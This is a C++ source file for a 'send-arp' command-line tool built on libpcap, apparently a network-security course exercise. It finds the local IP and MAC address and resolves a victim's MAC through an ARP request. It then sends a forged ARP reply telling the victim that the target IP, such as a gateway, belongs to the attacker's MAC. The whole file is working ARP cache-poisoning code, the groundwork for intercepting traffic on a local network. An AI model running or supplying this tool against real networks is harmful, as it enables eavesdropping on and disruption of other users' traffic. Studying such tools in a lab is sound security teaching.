#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

#define MAX_ATTEMPT_RECEIVE 10000

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1"); 
}

bool get_my_mac(Mac* mac, char* dev) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
		fprintf(stderr, "Failed to create socket!\n");
        return false;
    }
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
		fprintf(stderr, "Failed to get MAC address!\n");
		close(fd);
        return false;
    }
    *mac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
    close(fd);
    return true;
}

bool get_my_ip(Ip* ip, char *dev){
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
		fprintf(stderr, "Failed to create socket!\n");
        return false;
    }
    struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr)); 
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
		fprintf(stderr, "Failed to get IP address!\n");
		close(fd);
        return false;
    }
    struct sockaddr_in * sin = (struct sockaddr_in *)&ifr.ifr_addr;
    *ip = Ip(ntohl(sin->sin_addr.s_addr));
    close(fd);
    return true;
}

bool send_packet(pcap_t* pcap, Mac smac_eth, Mac dmac_eth, Mac smac_ip, Mac tmac_ip, Ip sip, Ip tip, bool isRequest){
	EthArpPacket packet;
	// Ethernet Header 
	packet.eth_.dmac_ = dmac_eth;
	packet.eth_.smac_ = smac_eth;
	packet.eth_.type_ = htons(EthHdr::Arp);
	// ARP Header 
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = isRequest ? htons(ArpHdr::Request) : htons(ArpHdr::Reply); 
	packet.arp_.smac_ = smac_ip;
	packet.arp_.sip_ = htonl(sip);
	packet.arp_.tmac_ = tmac_ip;
	packet.arp_.tip_ = htonl(tip);
	// send 
	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		return false; 
	}
	return true; 
}

bool receive_packet(pcap_t* pcap, Mac tmac_ip, Ip sip, Ip tip, Mac* sender_mac_out)
{
	struct pcap_pkthdr* header;
    const u_char* packet;
	bool mac_match; 
	for(int i=0; i< MAX_ATTEMPT_RECEIVE ; i++)
	{
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) {
            continue;  
        }
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            fprintf(stderr, "pcap_next_ex error: %d (%s)\n", res, pcap_geterr(pcap));
            return false;
        }

		// Received Packet을 ARP packet으로 Interpret
        EthArpPacket* received_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet));
		if (received_packet->eth_.type() != EthHdr::Arp) continue;
		if (ntohs(received_packet->arp_.op_) != ArpHdr::Reply) continue; 
		if (ntohl(received_packet->arp_.sip_) != sip) continue;
		if (ntohl(received_packet->arp_.tip_) != tip) continue;
		mac_match = true;
		for (int i = 0; i < 6; i++) {
			if (((uint8_t*)(received_packet->arp_.tmac_))[i] != ((uint8_t*)tmac_ip)[i]) {
				mac_match = false;
				break;
			}
		}
		if (!mac_match) continue;
		*sender_mac_out = Mac(received_packet->arp_.smac_);
        return true;
	}
	return false;
}

bool get_sender_MAC(pcap_t* pcap, Mac my_mac, Ip my_ip, Ip sender_ip, Mac* sender_mac_out) {
	Mac null_mac = Mac("00:00:00:00:00:00");
	Mac broadcast_mac =  Mac("FF:FF:FF:FF:FF:FF");
	if(!send_packet(pcap, my_mac, broadcast_mac, my_mac, null_mac, my_ip, sender_ip, true)) 
		return false;
	if(!receive_packet(pcap, my_mac, sender_ip, my_ip, sender_mac_out)) 
		return false; 
	return true;
}

int main(int argc, char* argv[]) {
	if (argc < 4 || (argc % 2) != 0) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	Ip ip;
	Mac mac;
	if (!get_my_ip(&ip, dev)){
		printf("[*] Error : couldn't get IP address!\n");
		return EXIT_FAILURE;
	}
	if (!get_my_mac(&mac, dev)){
		printf("[*] Error : couldn't get MAC address! \n");
		return EXIT_FAILURE;
	}
	printf("[*] My IP address : %s\n", std::string(ip).data());
	printf("[*] My MAC address : %s\n", std::string(mac).data());
	
	for(int i = 1; i < argc/2 ; i += 1){
		printf("==================================================\n");
		Ip sender_ip = Ip(argv[2*i]);
		Ip target_ip = Ip(argv[2*i+1]);
		Mac sender_mac;
		if(!get_sender_MAC(pcap, mac, ip, sender_ip, &sender_mac)){
			printf("[*] Error: receive error for get sender MAC!\n");
			continue;
		}
		printf("  [*] Sender%d IP address: %s\n",i,std::string(sender_ip).data());
		printf("  [*] Sender%d MAC address: %s\n",i,std::string(sender_mac).data());
		if(!send_packet(pcap, mac, sender_mac, mac, sender_mac, target_ip, sender_ip, false))
		{
			printf("[*] Error: Failed to send packet !\n");
			continue;
		}
	}
	printf("==================================================\n");
	pcap_close(pcap);
	return 0;
}


